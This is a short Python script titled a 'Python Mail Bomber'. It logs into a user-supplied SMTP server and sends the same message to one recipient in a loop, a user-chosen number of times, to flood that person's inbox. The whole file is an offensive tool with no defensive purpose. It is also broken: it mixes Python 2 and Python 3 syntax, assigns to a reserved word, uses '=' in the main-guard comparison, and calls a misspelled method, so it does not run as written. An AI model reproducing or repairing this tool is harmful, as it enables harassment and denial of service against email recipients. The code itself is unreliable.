import smtplib
import mimetypes
import sys
import time
from email.MIMEText import MIMEText

class SMTP(object):
    def title(self):
        print('[+] Python Mail Bomber: Success')
        
    def smtp_connect(self):
        print('We are in the SMTPconnect')
        self.smtpserver = raw_input('\nEnter SMTP Server: ')
        self.smtpport = input('Enter SMTP Port (e.g. 25 or 465): ')
        try:
            self.mail_server = smtplib.SMTP(self.smtpserver, self.smtpport)
        except IOError, e:
            print(f'Error: {e}')
            time.sleep(5)
            sys.exit(1)
        self.mail_server.starttls()
        self.username=raw_input('\nEnter Username: ')
        self.password=raw_input('Enter Password: ')
        try:
              self.mail_server.login(self.username, self.password)
        except BaseException, e:
              print(f'Error: {e}')
              time.sleep(3)
              sys.exit(1)         
                
    def build_email(self):
        print('We are inside build email')
        print('\tBuilding Message Part')
        self.from = raw_input("\nFrom: ")
        self.to = raw_input("\nTo: ")
        self.subject = raw_input("\nSubject: ")
        self.message = raw_input("\nMessage: ")

        message_data = MIMEText(self.message)
        message_data['From']=self.from
        message_data['To']=self.to
        message_data['Subject']=self.subject

        self.amount = input('How many times would you like to send the message: ')
        num = 0
        while num < self.amount:
            self.mail_server.sendmail(self.from, self.to, message_data.as_string())
            num += 1
        print(f'Send {self.amount} messages to {self.to}')
        time.sleep(7)

            
if __name__ = '__main__':
    s = SMTP()
    s.title()
    s.stmp_connect()
    s.build_email()
